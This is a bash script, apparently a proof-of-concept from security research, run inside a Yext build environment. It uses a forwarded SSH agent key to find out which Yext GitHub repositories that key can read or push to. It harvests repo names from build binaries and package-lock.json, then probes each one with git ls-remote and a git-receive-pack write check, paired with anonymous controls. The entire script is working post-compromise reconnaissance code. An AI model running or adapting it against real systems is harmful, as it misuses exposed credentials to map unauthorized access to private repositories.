#!/bin/bash
# Scope resolution for the forwarded deps_key. READ-ONLY and NON-MUTATING:
#  - git-upload-pack  advertisement  = the ref list only (no clone, no fetch of objects)
#  - git-receive-pack advertisement  = the write-permission check git push does BEFORE sending data;
#                                      we send NO pack and close the socket, so nothing is written.
# Every authenticated probe is paired with an ANONYMOUS control so "it worked" cannot be
# mistaken for "privileged access to something public".
echo "YEXTSCOPE-START"
export GIT_TERMINAL_PROMPT=0
SSHO="-o BatchMode=yes -o StrictHostKeyChecking=yes -o ConnectTimeout=15 -o PasswordAuthentication=no"
export GIT_SSH_COMMAND="ssh $SSHO"

echo "-- agent --"
ssh-add -l 2>&1 | sed 's/^/YEXTSCOPE agent: /'

echo "YEXTSCOPE-HARVEST-START"
# Repo names taken from Yext's own world-readable binaries + this build's tree. Not guessed.
{ strings -a /scripts/bin/cbdservice /scripts/bin/artifactbundler 2>/dev/null
  cat /opt/buildhome/repo/package-lock.json 2>/dev/null
} | grep -aoE '(github\.com[:/])(yext[a-z0-9-]*)/([A-Za-z0-9_.-]+)' \
  | sed -E 's|.*github\.com[:/]||; s|\.git$||' | sort -u > /tmp/cand.txt
echo "harvested=$(wc -l < /tmp/cand.txt)"
cat /tmp/cand.txt | sed 's/^/YEXTSCOPE cand: /'
echo "YEXTSCOPE-HARVEST-END"

probe() {
  R="$1"
  # anonymous control (unauthenticated HTTPS): public => refs, private => fail
  AN=$(timeout 25 git ls-remote --heads "https://github.com/$R" 2>/dev/null | wc -l)
  ANE=$?
  # authenticated READ: ref advertisement only
  AU=$(timeout 25 git ls-remote --heads "git@github.com:$R" 2>/tmp/e1 | wc -l)
  AUE=$?
  AUERR=$(head -c 160 /tmp/e1 | tr '\n' ' ')
  # authenticated WRITE oracle: receive-pack advertisement, no pack sent
  W=$(timeout 20 ssh $SSHO git@github.com "git-receive-pack '$R.git'" </dev/null 2>&1 | head -c 200 | tr -d '\0' | tr '\n' ' ')
  case "$W" in
    *"Permission to"*denied*) WV="WRITE=NO(denied)";;
    *"not found"*)            WV="WRITE=NA(notfound)";;
    *refs/*|*capabilities*)   WV="WRITE=YES(ref-adv)";;
    *)                        WV="WRITE=?($W)";;
  esac
  echo "YEXTSCOPE $R anon_refs=$AN auth_refs=$AU $WV ${AUERR:+autherr=[$AUERR]}"
}

echo "YEXTSCOPE-CONTROLS-START"
probe "yext/pages"                      # known PUBLIC  -> anon works too => not privileged
probe "yext/zz-does-not-exist-bb7731"   # NONEXISTENT   -> pins the not-found shape
probe "saansaan/yext-seclib-poc7731"    # MY OWN repo   -> pins the no-access shape for a 3rd-party repo
echo "YEXTSCOPE-CONTROLS-END"

echo "YEXTSCOPE-PROBE-START"
n=0
while read -r R; do
  [ -z "$R" ] && continue
  n=$((n+1)); [ "$n" -gt 16 ] && break
  case "$R" in yext/pages|saansaan/*) continue;; esac
  probe "$R"
done < /tmp/cand.txt
echo "YEXTSCOPE-PROBE-END"
echo "YEXTSCOPE-END"
